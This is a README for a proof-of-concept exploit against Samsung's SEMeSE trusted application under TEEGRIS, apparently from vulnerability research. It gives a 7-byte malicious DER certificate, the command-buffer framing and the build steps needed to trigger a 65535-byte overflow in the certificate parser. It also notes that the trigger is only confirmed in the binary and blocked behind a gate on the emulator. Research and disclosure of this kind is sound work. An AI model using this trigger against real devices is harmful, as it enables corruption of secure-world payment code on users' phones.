# semese_dercert — `parseItemsFromGpCert` DER-length overflow trigger

Focused proof-of-concept for the **HIGH** finding in SEMeSE (Samsung Pay eSE
Manager, TEEGRIS). It crafts a malicious GlobalPlatform certificate whose
hand-rolled DER TLV length field overflows in `parseItemsFromGpCert`, and
submits it through **cmd 314** (`sem_verify_esek_certificate_chain`), the verb
that routes `SAK-ROOT → eSEK` cert verification into that parser.

This is **not** the `semese_esek` command-sweep POC (which only characterizes
*which gate* each command hits). This POC builds the actual over-long DER blob
that drives the unbounded copy.

## Target

| | |
|---|---|
| TA | SEMeSE (Samsung Pay eSE Manager) |
| UUID | `00000000-0000-0000-0000-53454d655345` (ASCII tail `SEMeSE`) |
| Finding | #1 HIGH — controlled overflow in `parseItemsFromGpCert` (GP-cert TLV parser) |
| cmd_id | **314** (`sem_verify_esek_certificate_chain`); sibling **315** reaches the same parser past the same gate |
| param_types | `101` (`0x65`) = `TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_OUTPUT, NONE, NONE)` |

## Citations

All constants are grounded in the campaign writeups:

- `RE/samsung_teegris/semese.md` §"Vulnerability findings" #1 (lines 400-433):
  - parser `parseItemsFromGpCert @0x4F638`, `memset(out, 0, 0x150C)` (5388 B), fields 260 B apart.
  - DER length decode: `0x81 → u8 (≤0xFF)`, `0x82 → __rev16(u16)` (**up to 0xFFFF**) — lines 411-413.
  - the unclamped copy `LABEL_13: memcpy(v14, v13, v12)` with `v12 =` decoded length, **no clamp** to the 260-B field — lines 414-417.
  - the **only** length check is the outer body `if (v6 != a2 - v7)` — lines 420-421.
  - reachable from `sem_verify_esek_certificate_chain @0x51A50` (cmd 314) and `sem_verify_scp11_certificate_chain @0x52174` (cmd 315) — line 430; cmd table line 173-174.
  - canary smash path: `v_len = 0xFFFF` copy reaches the canary `[xbp-0x18]` ~17 KB above `s` — lines 555-563.
- `RE/emulation/semese.md`:
  - reachable cmds **45/46/47/303/304/314/315** — line 10.
  - the 7-byte trigger cert `7F 21 04 93 82 FF FF` (tag `0x93`, long-form length `0xFFFF`) drives a 65535-byte copy — lines 67-68, 90-93.
  - cmd 314 reaches the parser at `0x51EE4` **only after** the secure-object unwrap gate (`unwrapSecureObject_with_uuid == 0` and `n == 296`) — lines 98-123.
  - wire shape (`param_types == 101`, two 92172-byte memrefs, `sem_cmd_dispatch`) — lines 54-60.

## The crafted DER

`build_overflow_cert()` in `jni/poc.c` emits exactly 7 bytes:

```
7F 21    outer constructed tag  (GP CA-cert template)
04       outer length = 4       (== inner byte count; passes `v6 == a2 - v7`)
93       inner value tag 0x93   (an unclamped parser arm)
82       DER long form: 2 length octets follow
FF FF    length = __rev16(0xFFFF) = 65535   <-- the overflow driver
```

The parser then does `memcpy(out + field_off, &cert[v], 0xFFFF)` into a 260-byte
sub-field of the 5388-byte OUT struct — overrunning OUT, the intermediate
buffers, and the stack canary above. Seven cert bytes is the entire trigger; the
value bytes are read OOB past the short cert (also part of the bug).

## Wire framing

Inside the 92172-byte `params[0]` cmd buffer:

```
off 0       u32 cmd_id        = 314
off 8       u32 keyset_len    = 8       (wrapped eSEK keyset section)
off 20      u32 cert_len      = 7       (length of the GP cert that follows)
off 24      <7 cert bytes>              <-- the malicious DER lands here
off 92168   u32 payload_len   = 0x100   (must be < 0x16801)
```

## Build & run

```
cd teegris/pocs/semese_dercert
make emulator      # gcc -g3 -O0 -DEMULATE jni/poc.c -o ./poc
```

(The `Makefile` is copied verbatim from `gatekeeper_throttle`. `make phone`
cross-compiles via `$ANDROID_NDK`/ndk-build for a real device.)

Then start the SEMeSE emulator instance and run `./poc`:

```
emu_start.sh 00000000-0000-0000-0000-53454d655345 semese_dercert
./poc
```

## Repro status — DEVICE-ONLY / BLOCKED-ON-UNWRAP-GATE

`parseItemsFromGpCert` in cmd 314 is reached at `0x51EE4` **only after** the
secure-object unwrap gate:

```c
if ((u16)unwrapSecureObject_with_uuid(...))  return -2012;   // must return 0
if (n != 296)                                 return -2012;   // must set n == 296
...
parseItemsFromGpCert(v57, v10, s);                            // the overflow
```

`unwrapSecureObject_with_uuid` delegates to `TEES_UnwrapSecureObject`. The
emulator stubs this as a **no-op** (`setReturnValue(0)`, writes neither the
output buffer nor `*n`), so `n` keeps its init value `5100`, the `n != 296`
check is always true, and the handler bails **`-2012`** (`0xFFFFF824`) before the
parser. So out of the box this POC exercises the **routing** to the handler, not
the overflow itself.

The emulator now models `ASN1_get_object`, so the parser body is reachable past
the crypto **if the secure-object unwrap gate is soft-passed** — i.e. a
faked-to-296 `TEES_UnwrapSecureObject` so cmd 314/315 clear the `n == 296` check
and enter `parseItemsFromGpCert`. With that soft-pass the crafted DER reaches the
parser and the overflow fires.

On a **real device**, `TEES_UnwrapSecureObject` returns the genuine 296-byte
eSEK keyset, the gate passes naturally, and the crafted cert overflows the OUT
struct. The overflow itself is **CONFIRMED-IN-BINARY** (Hex-Rays decompile of
the parser + this crafted trigger cert); the emulator confirms only the
reachability boundary — the bug lives one secure-world gate past what the
emulator drives unless that gate is soft-passed.
